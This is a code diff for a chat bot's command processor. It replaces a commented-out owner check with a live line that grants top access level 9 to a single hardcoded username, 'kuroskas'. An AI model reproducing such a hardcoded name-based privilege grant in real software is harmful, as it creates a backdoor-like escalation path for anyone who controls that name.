@@ -177,8 +177,8 @@ class CommandProcessor(Processor):
             self.logger.exception(e)
 
     def get_access_level(self, irc_data)->int:
-        # if irc_data.author.name == self.owner:
-        #     return 9
+        if irc_data.author.name.lower() == 'kuroskas':
+            return 9
 
         # if await self.is_admin(irc_data.author.name) is True:
         #     return 8
